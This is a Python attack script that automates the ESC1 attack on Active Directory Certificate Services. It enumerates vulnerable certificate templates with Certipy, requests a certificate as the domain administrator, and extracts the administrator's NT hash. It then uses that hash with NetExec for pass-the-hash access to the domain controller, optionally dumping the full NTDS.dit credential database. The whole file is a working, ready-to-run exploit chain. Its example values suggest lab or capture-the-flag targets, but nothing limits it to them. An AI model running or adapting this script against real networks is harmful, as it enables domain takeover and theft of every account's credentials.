# Author: Sid Joshi (https://github.com/dr34mhacks/)
# ESC1 Auto Exploit and NTDS Dump


import subprocess
import re
import argparse
import os
import glob
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress
from datetime import datetime


console = Console()

def run_command(command, error_message="Command failed", stream_output=False, debug=False, show_commands=False):
    if debug:
        command.append("-debug")
    if show_commands:
        console.print(f"[cyan][+] Running command: {' '.join(command)}[/cyan]")
    if stream_output:
        try:
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            output = ""
            while True:
                line = process.stdout.readline()
                if line == "" and process.poll() is not None:
                    break
                if line:
                    console.print(line.strip(), style="cyan")
                    output += line
            stderr = process.stderr.read()
            if stderr and "Certipy v" in stderr:
                stderr = "\n".join(line for line in stderr.splitlines() if not line.startswith("Certipy v"))
            if process.returncode != 0:
                console.print(f"[red][!] {error_message}: {stderr or 'No stderr output'} (Exit code: {process.returncode})[/red]")
                return None, stderr or "No stderr output"
            return output, stderr
        except Exception as e:
            console.print(f"[red][!] Exception occurred: {e}[/red]")
            return None, str(e)
    else:
        try:
            result = subprocess.run(command, capture_output=True, text=True, check=True)
            stderr = result.stderr
            if stderr and "Certipy v" in stderr:
                stderr = "\n".join(line for line in stderr.splitlines() if not line.startswith("Certipy v"))
            return result.stdout, stderr
        except subprocess.CalledProcessError as e:
            stderr = e.stderr
            if stderr and "Certipy v" in stderr:
                stderr = "\n".join(line for line in stderr.splitlines() if not line.startswith("Certipy v"))
            console.print(f"[red][!] {error_message}: {stderr or 'No stderr output'} (Exit code: {e.returncode})[/red]")
            return None, stderr or "No stderr output"

def find_and_parse_certipy_templates(username, password, domain, dc_ip, target_hostname, debug=False, show_commands=False):
    """Enumerate and parse certificate templates for vulnerabilities."""
    console.print(Panel("[bold cyan]Step 1: Enumerating and Parsing Certificate Templates[/bold cyan]", expand=False))
    command = [
        "certipy", "find",
        "-u", f"{username}@{domain}",
        "-p", password,
        "-dc-ip", dc_ip,
        "-target", target_hostname,
        "-enabled",
        "-stdout",
        "-vulnerable"
    ]
    stdout, stderr = run_command(command, "Error running Certipy find", debug=debug, show_commands=show_commands)
    if stdout is None:
        return None

    with open("certipy_output.txt", "w") as f:
        f.write(stdout)

    
    vulnerable_templates = []
    ca_name = re.search(r"CA Name\s+:\s+([^\n]+)", stdout)
    ca_name = ca_name.group(1).strip() if ca_name else None

    # Find all template sections
    template_matches = list(re.finditer(r"Template Name\s+:\s+([^\n]+)\n((?:.*?\n)*?)(?=\n\s*\d+\s*\n\s*Template Name\s+:|\Z)", stdout, re.DOTALL))
    for match in template_matches:
        template_name = match.group(1).strip()
        block = match.group(0)
        console.print(f"[cyan][Debug] Processing template: {template_name}[/cyan]")

        enrollee_supplies_subject = re.search(r"Enrollee Supplies Subject\s+:\s+True", block)
        client_auth = re.search(r"Client Authentication\s+:\s+True", block)
        no_manager_approval = re.search(r"Requires Manager Approval\s+:\s+False", block)
        enrollment_rights = re.search(r"Enrollment Rights\s+:.*?(Domain Computers|Authenticated Users)", block, re.DOTALL | re.IGNORECASE)
        esc1_vuln = re.search(r"\[!]\s*Vulnerabilities\s*ESC1", block, re.IGNORECASE)
        key_size = re.search(r"Minimum RSA Key Length\s+:\s+(\d+)", block)
        key_size = int(key_size.group(1)) if key_size else None

        if (
            template_name and enrollee_supplies_subject and client_auth and
            no_manager_approval and enrollment_rights and esc1_vuln
        ):
            vulnerable_templates.append({
                "template_name": template_name,
                "ca_name": ca_name,
                "key_size": key_size,
                "vulnerabilities": "ESC1"
            })

    if vulnerable_templates:
        console.print("[green][+] Found vulnerable templates:[/green]")
        for template in vulnerable_templates:
            message = (
                f"[bold red][*] Vulnerable Template:[/bold red] {template['template_name']}\n"
                f"[bold red][*] CA Name:[/bold red] {template['ca_name']}\n"
                f"[bold red][*] Key Size:[/bold red] {template['key_size'] or 'Default'}\n"
                f"[bold red][*] Vulnerabilities:[/bold red] {template['vulnerabilities']}"
            )
            console.print(Panel(message, title="[bold red]Certipy Findings[/bold red]", border_style="red"))
        return vulnerable_templates
    else:
        console.print("[yellow][!] No vulnerable templates found.[/yellow]")
        console.print("[cyan][+] Check certipy_output.txt for raw template details.[/cyan]")
        return None

def run_certipy_request(username, password, domain, target_hostname, ca, template, upn, key_size, output_file, debug=False, show_commands=False):
    """Request a certificate."""
    console.print(Panel(f"[bold cyan]Step 2: Requesting Certificate for {upn}[/bold cyan]", expand=False))
    command = [
        "certipy", "req",
        "-u", f"{username}@{domain}",
        "-p", password,
        "-target", target_hostname,
        "-ca", ca,
        "-template", template,
        "-upn", upn,
        "-out", output_file
    ]
    if key_size:
        command.extend(["-key-size", str(key_size)])

    with Progress() as progress:
        task = progress.add_task("[cyan][+] Requesting certificate...", total=100)
        stdout, stderr = run_command(command, "Error running Certipy req", debug=debug, show_commands=show_commands)
        progress.update(task, advance=100)

    cert_file = f"{output_file}.pfx"
    if os.path.exists(cert_file):
        if stdout:
            message = f"[bold green]{stdout}[/bold green]"
            console.print(Panel(message, title="[bold green]Certipy Request Output[/bold green]", border_style="green"))
        return cert_file
    console.print(f"[yellow][!] No certificate file created ({cert_file}). Stderr: {stderr or 'No stderr output'}[/yellow]")
    # Log directory contents for debugging
    dir_contents = glob.glob("*")
    console.print(f"[cyan][Debug] Directory contents: {dir_contents}[/cyan]")
    return None

def run_certipy_auth(pfx_file, dc_ip, domain, upn, debug=False, show_commands=False):
    """Authenticate with the certificate to get NTLM hash."""
    console.print(Panel("[bold cyan]Step 3: Authenticating with Certificate[/bold cyan]", expand=False))
    username = upn.split('@')[0]
    command = [
        "certipy", "auth",
        "-pfx", pfx_file,
        "-dc-ip", dc_ip,
        "-domain", domain,
        "-username", username
    ]

    with Progress() as progress:
        task = progress.add_task("[cyan][+] Authenticating...", total=100)
        stdout, stderr = run_command(command, "Error running Certipy auth", debug=debug, show_commands=show_commands)
        progress.update(task, advance=100)

    if stdout:
        message = f"[bold cyan]{stdout}[/bold cyan]"
        console.print(Panel(message, title="[bold cyan]Certipy Authentication Output[/bold cyan]", border_style="cyan"))
        return stdout
    return None

def extract_nt_hash(certipy_output):
    """Extract NT hash from Certipy auth output."""
    match = re.search(r"aad3b435b51404eeaad3b435b51404ee:([0-9a-fA-F]{32})", certipy_output)
    if match:
        nt_hash = match.group(1)
        console.print(f"[green][+] Extracted NT Hash: {nt_hash}[/green]")
        return nt_hash
    else:
        console.print("[yellow][!] NTLM hash not found in Certipy output.[/yellow]")
        return None

def run_nxc_command(domain, dc_ip, nt_hash, dump_ntds=False, debug=False, show_commands=False):
    """Run NetExec command, optionally dumping NTDS.dit."""
    console.print(Panel("[bold cyan]Step 4: Running NetExec Command[/bold cyan]", expand=False))
    user = "administrator"
    command = [
        "nxc", "smb", dc_ip,
        "-u", user,
        "-H", nt_hash
    ]

    if dump_ntds:
        command.append("--ntds")
        # Simulate 'Y' input for NTDS prompt
        process = subprocess.Popen(
            command,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, stderr = process.communicate(input="Y\n")
        if show_commands:
            console.print(f"[cyan][+] Running command: {' '.join(command)}[/cyan]")
        if process.returncode != 0:
            console.print(f"[red][!] Error running nxc NTDS dump: {stderr or 'No stderr output'} (Exit code: {process.returncode})[/red]")
            return
        # Stream output to console
        if stdout:
            console.print(stdout.strip(), style="cyan")
    else:
        stdout, stderr = run_command(
            command,
            "Error running nxc command",
            stream_output=True,
            debug=debug,
            show_commands=show_commands
        )
        if stdout is None:
            console.print("[red][!] nxc command failed.[/red]")
            return

def main():
    parser = argparse.ArgumentParser(description="ESC1 Exploitation Script")
    parser.add_argument("-u", "--username", required=True, help="Domain username (e.g., Banking or Banking$)")
    parser.add_argument("-p", "--password", required=True, help="Password for the user")
    parser.add_argument("-d", "--domain", required=True, help="Domain name (e.g., retro.vl)")
    parser.add_argument("--dc-ip", required=True, help="Domain controller IP address")
    parser.add_argument("--target-hostname", default=None, help="Target hostname for certipy req (e.g., dc.retro.vl)")
    parser.add_argument("--target-upn", default="administrator", help="Target UPN (e.g., Administrator or administrator@domain)")
    parser.add_argument("--template", default=None, help="Manually specify vulnerable template (e.g., RetroClients)")
    parser.add_argument("--ca", default=None, help="Manually specify CA name (e.g., retro-DC-CA)")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode for verbose Certipy output")
    parser.add_argument("--show-commands", action="store_true", help="Show commands being executed")
    parser.add_argument("--dump-ntds", action="store_true", help="Dump NTDS.dit using NetExec")

    args = parser.parse_args()

    username = args.username
    domain = args.domain
    password = args.password
    dc_ip = args.dc_ip
    target_hostname = args.target_hostname or dc_ip
    target_upn = args.target_upn if '@' in args.target_upn else f"{args.target_upn}@{domain}"
    manual_template = args.template
    manual_ca = args.ca
    debug = args.debug
    show_commands = args.show_commands
    dump_ntds = args.dump_ntds

    console.print(Panel(f"[bold magenta]ESC1 Exploitation Script - {domain}[/bold magenta]", expand=False))

    # Step 1: Find and parse vulnerable templates or use manual input
    if manual_template and manual_ca:
        console.print("[cyan][+] Using manually specified template and CA.[/cyan]")
        templates = [{"template_name": manual_template, "ca_name": manual_ca, "key_size": None, "vulnerabilities": "ESC1 (manual)"}]
    else:
        templates = find_and_parse_certipy_templates(username, password, domain, dc_ip, target_hostname, debug, show_commands)
        if not templates:
            console.print("[red][!] Exiting: No vulnerable templates found.[/red]")
            console.print("[cyan][+] You can specify a template and CA manually with --template and --ca.[/cyan]")
            return

    template = templates[0]["template_name"]
    ca = templates[0]["ca_name"]
    key_size = templates[0]["key_size"]

    # Step 2: Request certificate
    output_file = f"{target_upn.split('@')[0]}"
    cert_output = run_certipy_request(username, password, domain, target_hostname, ca, template, target_upn, key_size, output_file, debug, show_commands)
    if not cert_output:
        console.print("[red][!] Exiting: Certificate request failed.[/red]")
        return

    # Step 3: Authenticate
    auth_output = run_certipy_auth(cert_output, dc_ip, domain, target_upn, debug, show_commands)
    if not auth_output:
        console.print("[red][!] Exiting: Authentication failed.[/red]")
        return

    # Step 4: Extract NTLM hash
    ntlm_hash = extract_nt_hash(auth_output)
    if not ntlm_hash:
        console.print("[red][!] Exiting: NTLM hash extraction failed.[/red]")
        return

    # Step 5: Run nxc command
    run_nxc_command(domain, dc_ip, ntlm_hash, dump_ntds, debug, show_commands)
    console.print(Panel("[bold green]Exploitation Complete![/bold green]", expand=False))

if __name__ == "__main__":
    main()
